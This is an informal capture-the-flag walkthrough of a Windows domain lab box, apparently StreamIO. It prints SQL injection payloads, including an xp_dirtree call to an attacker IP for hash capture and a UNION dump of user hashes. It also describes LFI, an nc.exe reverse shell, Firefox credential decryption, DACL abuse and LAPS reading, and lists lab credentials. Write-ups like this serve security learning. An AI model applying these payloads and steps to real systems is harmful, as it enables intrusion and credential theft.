Started with a nmap scan
```
53 DNS
80 IIS 10.0
88 Kerberos
135
139
389
443 httpd 2.0
636
3268
3269
5985 winrm
```
Domain `streamIO.htb` Hostname `DC` The SSL cert on `443` shows another subdomain `watch.streamio.htb` gonna fuzz for more subdomains while we wait for this the webhost on port `80` is a default windows IIS page going to the https all we have is a contact forum and on the `watch` subdomain we have a email subscription signup the subdomain scan did not find anything else so fuzzing the webhost we found a `/admin` on the main site and there is a `master.php` which says its only accessible with includes so testing more pages we found a sqli injection in the `search.php` page on the `watch` subdomain after playing around for a bit I found we could do this  `q='; use mast er; exec xp_dirtree '\\10.10.14.8\404';-- -` and run responder and we get a hash for the `DC$` user 
but we cant do much with this so lets keep trying and got a payload for all users `' union select 1,concat_ws(':',username,password),3,4,5,6 FROM streamio.dbo.users; -- -` and we got all the users and hashes and we can crack these since there MD5 and we was able to login with one account `yoshihide:66boysandgirls..` if we go to `/admin/` and click on one of the links it looks like it could be LFI vulnerable test them all did not find one but maybe there is more so we can fuzz and see if we can find one and we got `debug` and we can use php filters to encode the `master.php` file and we can see the contents once we decode it and we can send a POST with the `include=` and we can use this to drop `nc.exe` onto the host machine to get a reverse shell once we gave a shell onto the host machine looking at the source code we found the db creds in the `login.php` file `db_user:B1@hB1@hB1@h` now we need to access the sql service from the machine we can do local port forwarding and we found some more users in the database we can try and cracking them also `nikk37:get_dem_girls2@yahoo.com` and now we have winrm access running winpeas we see there is firefox with stored creds and we can look at `logins.json` and get the encrypted usernames and passwords and we can decrypt it we got  anew login `JDgodd:JDg0dd1s@d0p3cr3@t0r` looking at the bloodhound data this user has write owner over CORE staff so we can use dacledit and add are permissions and then and are self to the group then we can read LAPS to get the admin password `admin:cW4+P)&.7YBv1`  
